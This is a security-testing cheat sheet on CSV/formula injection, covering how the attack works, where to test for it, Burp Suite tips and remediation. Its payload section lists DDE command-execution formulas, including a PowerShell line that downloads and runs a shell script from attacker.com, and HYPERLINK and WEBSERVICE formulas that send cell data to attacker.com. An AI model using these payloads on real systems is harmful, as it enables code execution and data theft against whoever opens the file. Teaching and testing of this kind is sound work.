# CSV / Formula Injection

## Overview
CSV Injection (also called Formula Injection or Spreadsheet Injection) occurs when user-supplied data that will be exported to a CSV file contains formula prefixes (`=`, `+`, `-`, `@`) that spreadsheet applications like Excel or LibreOffice interpret and execute as formulas. When a victim opens the CSV, the formula can execute OS commands via DDE, exfiltrate data, or run malicious macros.

## How It Works
- Spreadsheet applications auto-evaluate cells starting with `=`, `+`, `-`, `@` as formulas.
- `=CMD|' /C calc'!A0` triggers a DDE (Dynamic Data Exchange) command in older Excel.
- `=HYPERLINK("http://attacker.com/"&A1&B1, "Click")` exfiltrates cell data when the victim hovers.
- Even modern Excel/LibreOffice with Protected View will show a security warning, but less security-aware users click "Enable Content".
- The vulnerability exists whenever user input lands in an exported CSV that may be opened in a spreadsheet application.

## Impact
- Remote code execution on the victim's machine (the person who opens the CSV, often an admin or analyst).
- Data exfiltration: spreadsheet formula sends data to attacker's server when opened.
- Phishing: malicious formula redirects victim to attacker-controlled site.
- Social engineering leverage: the payload appears to come from a trusted system.

## Where to Look
- Any feature that exports user-controlled data to CSV: user reports, order exports, audit logs, contact lists.
- Admin panels that export user data (username, email, address fields from user registration).
- Feedback forms, comments, support tickets that get exported to CSV.
- "Export as CSV/Excel" buttons anywhere in the application.
- Data analytics dashboards that export to spreadsheet format.

## Testing Steps
1. Find any input field whose value might appear in an exported CSV.
2. Register or submit data with a formula payload: `=CMD|' /C calc'!A0`.
3. Trigger the CSV export (e.g., admin exports user list, download your own data).
4. Open the downloaded CSV file in Excel or LibreOffice.
5. Observe if a security warning appears (confirming the formula is present).
6. If "Enable Content" is clicked, observe if the command executes.
7. Test simpler detection payloads that don't execute commands but are visible: `=1+1`.
8. Test for data exfiltration via `=HYPERLINK`.

## Payloads / Techniques
```
# Basic formula detection
=1+1
=SUM(1,1)

# DDE command execution (Excel older versions)
=CMD|' /C calc'!A0
=CMD|' /C powershell -nop -w hidden -e <base64_payload>'!A0
+CMD|' /C calc'!A0
-CMD|' /C calc'!A0
@CMD|' /C calc'!A0

# DDE with msfvenom payload
=CMD|'/C powershell IEX(New-Object Net.WebClient).DownloadString("http://attacker.com/shell.ps1")'!A0

# Data exfiltration via HYPERLINK
=HYPERLINK("http://attacker.com/?d="&A2&B2, "ClickMe")
=HYPERLINK(CONCAT("http://attacker.com/?data=",ENCODEURL(A1)),"link")

# LibreOffice macro injection
=WEBSERVICE("http://attacker.com/"&CELL("address",A1))

# Bypass quote filtering
="=CMD|' /C calc'!A0"
```

## Burp Suite Tips
- In **Repeater**, submit formula payloads in any text field that appears in exported data.
- Intercept the CSV download and verify your payload is present unescaped in the response.
- No Burp extension specifically for CSV injection — manual verification by opening the file is needed.

## Tools
- Manual: Excel / LibreOffice to test the exported file
- Burp Suite for intercepting the export and verifying payload presence
- CSVInjectionPoC payloads from SecLists

## Remediation
- Prepend any cell value that starts with `=`, `+`, `-`, or `@` with a single quote `'` to neutralize it as a formula.
- Escape or strip formula-triggering characters from all user-supplied data before CSV export.
- Use server-side libraries (e.g., Apache POI for Java, xlsxwriter for Python) that properly escape cell values.
- Add a header row or meta notation warning that the file contains user-supplied data.
- Educate analysts and admins about the risks of enabling macros/DDE in exported files.

## References
https://owasp.org/www-community/attacks/CSV_Injection
https://portswigger.net/research/csv-injection
https://cheatsheetseries.owasp.org/cheatsheets/CSV_Injection_Prevention_Cheat_Sheet.html
